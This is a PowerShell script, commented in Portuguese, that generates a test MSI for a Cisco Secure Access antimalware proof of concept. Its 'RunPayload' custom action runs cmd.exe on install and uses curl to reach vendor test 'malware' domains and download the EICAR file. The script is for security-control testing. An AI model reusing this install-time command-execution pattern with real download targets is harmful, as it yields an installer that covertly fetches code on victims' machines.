$ErrorActionPreference = "Stop"

$msiPath = Join-Path $PSScriptRoot "poc-malicious-test.msi"
if (Test-Path $msiPath) { Remove-Item $msiPath -Force }

Write-Host ""
Write-Host "========================================================" -ForegroundColor Cyan
Write-Host "  POC Cisco Secure Access - Gerador de MSI de Teste"      -ForegroundColor Cyan
Write-Host "========================================================" -ForegroundColor Cyan
Write-Host ""

# ---------------------------------------------------------------------------
# Usa Windows Installer COM (nativo do Windows, sem dependencias extras)
# ---------------------------------------------------------------------------

$installer = New-Object -ComObject WindowsInstaller.Installer
$database  = $installer.OpenDatabase($msiPath, 3) # 3 = msiOpenDatabaseModeCreate

function Invoke-MsiSQL {
    param([string]$sql)
    $view = $database.OpenView($sql)
    $view.Execute()
    $view.Close()
    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($view) | Out-Null
}

# --- Summary Information ---
$si = $database.SummaryInformation(20)
$si.Property(1)  = 1252
$si.Property(2)  = "POC Malicious MSI Test"
$si.Property(3)  = "Cisco Secure Access POC - Antimalware"
$si.Property(4)  = "POC Lab"
$si.Property(7)  = "Intel;1033"
$si.Property(9)  = "{$([guid]::NewGuid().ToString().ToUpper())}"
$si.Property(14) = 200
$si.Property(15) = 2
$si.Persist()
Write-Host "[1/5] Summary Information criado" -ForegroundColor Green

# --- Property ---
Invoke-MsiSQL "CREATE TABLE ``Property`` (``Property`` CHAR(72) NOT NULL, ``Value`` LONGCHAR NOT NULL LOCALIZABLE PRIMARY KEY ``Property``)"

$productCode = "{$([guid]::NewGuid().ToString().ToUpper())}"
$upgradeCode = "{$([guid]::NewGuid().ToString().ToUpper())}"

$properties = @(
    @("ProductCode",     $productCode),
    @("UpgradeCode",     $upgradeCode),
    @("ProductVersion",  "1.0.0"),
    @("ProductName",     "POC Security Test"),
    @("Manufacturer",    "POC Lab"),
    @("ProductLanguage", "1033"),
    @("CMDPATH",         "cmd.exe")
)

foreach ($p in $properties) {
    Invoke-MsiSQL "INSERT INTO ``Property`` (``Property``, ``Value``) VALUES ('$($p[0])', '$($p[1])')"
}
Write-Host "[2/5] Property table criada" -ForegroundColor Green

# --- Directory ---
Invoke-MsiSQL "CREATE TABLE ``Directory`` (``Directory`` CHAR(72) NOT NULL, ``Directory_Parent`` CHAR(72), ``DefaultDir`` LONGCHAR NOT NULL LOCALIZABLE PRIMARY KEY ``Directory``)"
Invoke-MsiSQL "INSERT INTO ``Directory`` (``Directory``, ``Directory_Parent``, ``DefaultDir``) VALUES ('TARGETDIR', '', 'SourceDir')"
Write-Host "[3/5] Directory table criada" -ForegroundColor Green

# --- CustomAction ---
# Tipo 114 = 50 (EXE via property) + 64 (continue on error)
# Source = property CMDPATH (resolve para cmd.exe)
# Target = linha de comando que chama URLs maliciosas
Invoke-MsiSQL "CREATE TABLE ``CustomAction`` (``Action`` CHAR(72) NOT NULL, ``Type`` SHORT NOT NULL, ``Source`` CHAR(72), ``Target`` LONGCHAR PRIMARY KEY ``Action``)"

$cmdTarget = "/c " +
    "echo ============================================================ & " +
    "echo [MSI-POC] Cisco Secure Access - Teste Antimalware/Sandbox & " +
    "echo [MSI-POC] Data: %DATE% %TIME% & " +
    "echo ============================================================ & " +
    "echo. & " +
    "echo [1/3] Acessando examplemalwaredomain.com (dominio malware Cisco)... & " +
    "curl.exe -v -m 10 http://examplemalwaredomain.com/test 2>&1 & " +
    "echo. & " +
    "echo [2/3] Acessando internetbadguys.com (dominio malware Cisco)... & " +
    "curl.exe -v -m 10 http://internetbadguys.com/malware.exe 2>&1 & " +
    "echo. & " +
    "echo [3/3] Baixando EICAR test file (antimalware test)... & " +
    "curl.exe -v -m 10 -o %TEMP%\eicar-msi-test.txt https://secure.eicar.org/eicar.com.txt 2>&1 & " +
    "echo. & " +
    "echo ============================================================ & " +
    "echo [MSI-POC] Teste concluido. Verifique os logs do Secure Access. & " +
    "echo ============================================================ & " +
    "timeout /t 30"

Invoke-MsiSQL "INSERT INTO ``CustomAction`` (``Action``, ``Type``, ``Source``, ``Target``) VALUES ('RunPayload', 114, 'CMDPATH', '$cmdTarget')"
Write-Host "[4/5] CustomAction criada (chamadas a URLs maliciosas)" -ForegroundColor Green

# --- InstallExecuteSequence ---
Invoke-MsiSQL "CREATE TABLE ``InstallExecuteSequence`` (``Action`` CHAR(72) NOT NULL, ``Condition`` CHAR(255), ``Sequence`` SHORT PRIMARY KEY ``Action``)"

$sequence = @(
    @("CostInitialize",   "", 800),
    @("FileCost",          "", 900),
    @("CostFinalize",      "", 1000),
    @("InstallValidate",   "", 1400),
    @("InstallInitialize", "", 1500),
    @("RunPayload",        "", 1550),
    @("InstallFinalize",   "", 6600)
)

foreach ($s in $sequence) {
    Invoke-MsiSQL "INSERT INTO ``InstallExecuteSequence`` (``Action``, ``Condition``, ``Sequence``) VALUES ('$($s[0])', '$($s[1])', $($s[2]))"
}
Write-Host "[5/5] InstallExecuteSequence criada" -ForegroundColor Green

# --- Commit ---
$database.Commit()
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($database)  | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($installer) | Out-Null

Write-Host ""
Write-Host "========================================================" -ForegroundColor Green
Write-Host "  MSI gerado com sucesso!" -ForegroundColor Green
Write-Host "  Arquivo: $msiPath" -ForegroundColor Green
Write-Host "========================================================" -ForegroundColor Green
Write-Host ""
Write-Host "Para executar o teste:" -ForegroundColor Yellow
Write-Host "  .\run-test.bat" -ForegroundColor White
Write-Host ""
Write-Host "Ou manualmente:" -ForegroundColor Yellow
Write-Host "  msiexec /i `"$msiPath`" /qb" -ForegroundColor White
Write-Host ""
Write-Host "O MSI vai tentar:" -ForegroundColor Yellow
Write-Host "  [1] http://examplemalwaredomain.com/test" -ForegroundColor White
Write-Host "  [2] http://internetbadguys.com/malware.exe" -ForegroundColor White
Write-Host "  [3] https://secure.eicar.org/eicar.com.txt (EICAR)" -ForegroundColor White
Write-Host ""
Write-Host "O Secure Access deve bloquear todas essas chamadas." -ForegroundColor Cyan
Write-Host ""
